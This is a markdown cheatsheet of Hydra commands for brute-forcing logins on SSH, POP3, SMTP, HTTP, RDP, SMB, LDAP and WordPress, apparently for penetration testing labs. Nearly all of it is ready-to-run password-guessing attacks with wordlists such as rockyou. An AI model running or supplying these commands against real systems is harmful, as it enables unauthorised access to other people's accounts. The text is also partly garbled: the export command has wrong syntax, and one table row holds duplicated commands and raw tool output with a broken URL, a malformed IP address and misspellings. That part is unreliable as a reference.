$Hydra-Cheatsheet
Hydra Password Cracking Cheetsheet

The following table uses the $ip variable which can be set with the following command:  

`export ip 10.10.10.1`


| Command | Description |
|-------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|
$ hydra -L users.txt-p buterfly 10.10.137.76 ssh                                                                                                 $ hydra -L users.txt-p buterfly 10.10.137.76 ssh                      |
Hydra v9.0 (ttps://github.com/vanhauser-the/the-hydra) starting at 2024-04 15:00:00                            (DATA) max 1 task per 1 server.overall 1 task.s login tries(l:p:1).- try per task         (DATA) attacking ssh://10.137.76:22/                 (STATUS)1.00 tries/min,5 tries in 00:05h, to do in 00:05h, 1 active                                                                                [22][ssh] host:10.10.@37.76 login:molly password:buterfly 1 of 1 target sucessfully completed,l valid password found         |
| hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh                                                                                                                                                  | Hydra SSH Against Known username on port 22          |
| hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V                                                                          | Hydra POP3 Brute Force                               |
| hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V                                                                                         | Hydra SMTP Brute Force                               |
| hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin                                                                                 | Hydra attack http get 401 login with a dictionary    |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip                                                           | Hydra attack Windows Remote Desktop with rockyou     |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb                                                             | Hydra brute force SMB user with rockyou:             |
| hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login            |
| hydra -L usernames.txt -P passwords.txt $ip smb -V -f | SMB Brute Forcing |
| hydra -L users.txt -P passwords.txt $ip ldap2 -V -f | LDAP Brute Forcing |
  
